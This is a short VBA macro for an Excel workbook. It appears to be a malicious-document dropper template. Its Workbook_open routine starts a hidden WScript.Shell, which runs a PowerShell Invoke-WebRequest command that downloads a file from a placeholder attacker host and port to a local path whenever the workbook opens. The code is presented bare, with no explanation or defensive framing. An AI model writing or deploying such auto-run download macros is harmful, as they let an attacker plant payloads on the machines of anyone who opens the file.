Private Sub Workbook_open()
    
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim psCmd As String
    
    psCmd = "powershell -Command iwr -uri http://<ip>:<port>/<file> -OutFile /path/to/save/<file>"
    
    shell.Run psCmd, 1, True

End Sub
